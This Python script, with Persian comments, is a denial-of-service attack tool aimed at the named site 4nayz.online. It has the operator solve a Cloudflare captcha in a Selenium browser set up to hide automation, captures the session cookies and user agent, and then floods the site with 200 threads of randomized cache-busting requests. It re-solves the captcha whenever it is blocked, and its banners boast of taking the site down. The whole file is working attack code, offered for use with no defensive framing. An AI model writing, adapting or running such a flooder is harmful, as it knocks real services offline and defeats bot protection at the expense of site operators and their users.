import os
import sys
import time
import json
import random
import string
import hashlib
import threading
import subprocess
from datetime import datetime

# ============================================
# نصب پکیج‌ها (اگه نصب نیست)
# ============================================

def install_packages():
    packages = [
        "cloudscraper",
        "selenium",
        "requests",
        "fake-useragent"
    ]

    for pkg in packages:
        try:
            exec(f"import {pkg.replace('-', '_')}")
        except ImportError:
            print(f"[*] نصب {pkg}...")
            os.system(f"pip install {pkg} -q")

    # نصب chromedriver
    try:
        from selenium import webdriver
    except:
        os.system("pip install selenium -q")

    # چک کردن ChromeDriver
    if not os.path.exists("chromedriver.exe"):
        print("[*] دانلود ChromeDriver...")
        os.system("pip install webdriver-manager -q")

install_packages()

# ============================================
# ایمپورت‌ها
# ============================================

try:
    import cloudscraper
except:
    os.system("pip install cloudscraper -q")
    import cloudscraper

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
except:
    os.system("pip install selenium -q")
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service

try:
    from webdriver_manager.chrome import ChromeDriverManager
    HAS_MANAGER = True
except:
    HAS_MANAGER = False

# ============================================
# تنظیمات اصلی
# ============================================

# دو تا سایت هدف
TARGETS = [
    "https://4nayz.online",
    "https://4nayz.online"  # همون سایت رو دو بار میزنیم
]

RUNNING = True
success = 0
fail = 0
bypass_count = 0
session_cookies = {}
lock = threading.Lock()
start_time = time.time()
captcha_solved = threading.Event()

# ============================================
# نمایش بنر
# ============================================

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - BYPASS ATTACK v2.0 💀           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  🎯 کروم باز میشه → کپچا حل کن → حمله شروع             ║
║  🔥 تا کپچای بعدی (حدود ۵-۱۰ دقیقه)                    ║
║  💪 ۲۰۰ ترد - سایت رو down میکنه                       ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    """)

# ============================================
# تابع ۱: باز کردن مرورگر و حل کپچا
# ============================================

def open_browser_and_solve():
    """کروم رو باز میکنه، کپچا رو حل کن"""
    global session_cookies, bypass_count

    print("\n" + "="*50)
    print("🌐 مرحله ۱: باز کردن مرورگر کروم")
    print("="*50)
    print("\n✅ کروم باز میشه...")
    print("✅ کپچای Cloudflare رو حل کن")
    print("✅ بعد از حل شدن، صفحه رو نبند")
    print("✅ برگرد به ترمینال و Enter بزن\n")

    driver = None

    try:
        # تنظیمات کروم
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--allow-running-insecure-content")

        # User-Agent واقعی
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        # باز کردن کروم
        if HAS_MANAGER:
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
        else:
            driver = webdriver.Chrome(options=chrome_options)

        # رفتن به سایت
        driver.get(TARGETS[0])
        print(f"[+] صفحه {TARGETS[0]} باز شد")
        print(f"[+] لطفاً کپچا رو حل کن...\n")

        # منتظر موندن برای حل کپچا
        input("⏳ بعد از حل کپچا، اینجا Enter بزن: ")

        # گرفتن کوکی‌ها
        cookies = driver.get_cookies()
        session_cookies = {c['name']: c['value'] for c in cookies}

        # ذخیره کوکی‌ها
        with open('cookies.json', 'w') as f:
            json.dump(session_cookies, f)

        print(f"\n✅ {len(cookies)} کوکی گرفته شد و ذخیره شد")
        bypass_count += 1

        # گرفتن User-Agent
        ua = driver.execute_script("return navigator.userAgent")
        with open('user_agent.txt', 'w') as f:
            f.write(ua)

        print(f"✅ User-Agent ذخیره شد")

        # بستن کروم
        driver.quit()
        captcha_solved.set()

        return True

    except Exception as e:
        print(f"\n❌ خطا: {e}")
        if driver:
            try:
                driver.quit()
            except:
                pass
        return False

# ============================================
# تابع ۲: تولید URL منحصر به فرد
# ============================================

def generate_random_string(length=16):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def generate_url(target):
    paths = [
        "/", "/guess-x", "/guess-x/play", "/guess-x/bet",
        "/mines", "/mines/play", "/mines/reveal",
        "/api", "/api/v1", "/api/v1/auth",
        "/login", "/register", "/profile",
        "/moneydrop", "/survivor", "/shoot",
        "/hangtight", "/leaderboard", "/challenges"
    ]

    params = {
        't': str(time.time_ns()),
        'r': generate_random_string(32),
        'h': hashlib.md5(generate_random_string(64).encode()).hexdigest(),
        'v': str(random.randint(1, 9999)),
        'n': str(random.randint(1, 999999999)),
        '_': str(random.randint(1, 999999999)),
        'cache': 'false'
    }

    query = '&'.join([f"{k}={v}" for k, v in params.items()])
    path = random.choice(paths)

    return f"{target}{path}?{query}"

# ============================================
# تابع ۳: حمله با سشن معتبر
# ============================================

def attack_worker():
    """هر ترد این تابع رو اجرا میکنه"""
    global success, fail, bypass_count, session_cookies, RUNNING

    try:
        # خوندن User-Agent
        try:
            with open('user_agent.txt', 'r') as f:
                user_agent = f.read().strip()
        except:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        # ساختن اسکراپر
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'desktop': True,
                'mobile': False
            },
            delay=0.01
        )

        # اضافه کردن کوکی‌ها
        for name, value in session_cookies.items():
            scraper.cookies.set(name, value)

        # هدرها
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Referer': TARGETS[0]
        }

        while RUNNING:
            try:
                # انتخاب یک سایت تصادفی
                target = random.choice(TARGETS)
                url = generate_url(target)

                # درخواست
                if random.random() < 0.3:
                    r = scraper.post(url, headers=headers, timeout=5)
                else:
                    r = scraper.get(url, headers=headers, timeout=5)

                # اگه کپچا خورد
                if r.status_code in [503, 403]:
                    with lock:
                        fail += 1
                    # کپچا رو ریست کن
                    captcha_solved.clear()
                    return
                else:
                    with lock:
                        success += 1

            except:
                with lock:
                    fail += 1

    except:
        pass

# ============================================
# تابع ۴: نمایش آمار
# ============================================

def show_stats():
    global RUNNING, success, fail, bypass_count

    while RUNNING:
        time.sleep(2)
        elapsed = int(time.time() - start_time)
        total = success + fail
        rate = total // max(elapsed, 1)

        os.system('cls' if os.name == 'nt' else 'clear')

        print("""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - ATTACK IN PROGRESS 💀           ║
╠══════════════════════════════════════════════════════════╣
        """)

        print(f"  ⏱ زمان: {elapsed} ثانیه")
        print(f"  ✅ موفق: {success:,}")
        print(f"  ❌ خطا: {fail:,}")
        print(f"  🚀 نرخ: {rate:,}/s")
        print(f"  📊 مجموع: {total:,}")
        print(f"  🔄 دور زدن کپچا: {bypass_count}")

        # پیشبینی زمان down شدن
        if rate > 0:
            remaining = 50000 - total
            if remaining > 0:
                est_time = remaining // rate
                print(f"  ⏳ تخمین down شدن: {est_time} ثانیه دیگه")
            else:
                print(f"  💀 سایت down شد!")

        print("""
╚══════════════════════════════════════════════════════════╝
        """)

        print("  [Ctrl+C برای توقف]")

# ============================================
# تابع ۵: چک کردن کپچا
# ============================================

def check_captcha_periodically():
    """هر ۳ دقیقه چک میکنه اگه کپچا فعال شده"""
    global bypass_count, session_cookies

    while RUNNING:
        time.sleep(180)  # 3 دقیقه

        if not captcha_solved.is_set():
            print("\n⚠️ کپچا فعال شده!")
            print("🌐 باز کردن کروم برای حل مجدد...")

            if open_browser_and_solve():
                print("✅ کپچا دوباره حل شد! ادامه حمله...")

# ============================================
# تابع اصلی
# ============================================

def main():
    global RUNNING, start_time, session_cookies

    show_banner()

    # مرحله ۱: حل کپچا
    print("📌 مرحله ۱: حل کپچا")
    print("-"*40)

    if not open_browser_and_solve():
        print("\n❌ خطا در باز کردن مرورگر!")
        print("مطمئن شو Chrome نصب باشه")
        input("\nEnter بزن برای خروج...")
        sys.exit(1)

    print("\n✅ کپچا حل شد!")
    print("🚀 شروع حمله با ۲۰۰ ترد...")
    time.sleep(1)

    start_time = time.time()

    # شروع نمایش آمار
    stats_thread = threading.Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()

    # شروع چک کپچا
    check_thread = threading.Thread(target=check_captcha_periodically)
    check_thread.daemon = True
    check_thread.start()

    # شروع کارگرها
    workers = []
    for i in range(200):
        w = threading.Thread(target=attack_worker)
        w.daemon = True
        w.start()
        workers.append(w)

    # منتظر موندن برای توقف
    try:
        while True:
            time.sleep(1)

            # اگه کپچا فعال شد، صبر کن تا حل بشه
            if not captcha_solved.is_set():
                print("\n⚠️ کپچا فعال شد! منتظر حل مجدد...")
                # دوباره کروم باز کن
                if open_browser_and_solve():
                    print("✅ ادامه حمله...")
                    # کارگرهای جدید شروع کن
                    for i in range(200):
                        w = threading.Thread(target=attack_worker)
                        w.daemon = True
                        w.start()

    except KeyboardInterrupt:
        print("\n\n🛑 توقف حمله...")
        RUNNING = False

        elapsed = int(time.time() - start_time)
        total = success + fail

        print(f"""
╔══════════════════════════════════════════════════════════╗
║                    🛑 ATTACK STOPPED                    ║
╠══════════════════════════════════════════════════════════╣
║  ⏱ زمان: {elapsed} ثانیه                              ║
║  ✅ موفق: {success:,}                                  ║
║  ❌ خطا: {fail:,}                                      ║
║  🔄 دور زدن کپچا: {bypass_count}                       ║
║  📊 مجموع: {total:,}                                   ║
╚══════════════════════════════════════════════════════════╝
        """)

        input("\nEnter بزن برای خروج...")
        sys.exit(0)

# ============================================
# اجرا
# ============================================

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n❌ خطای اصلی: {e}")
        input("\nEnter بزن برای خروج...")
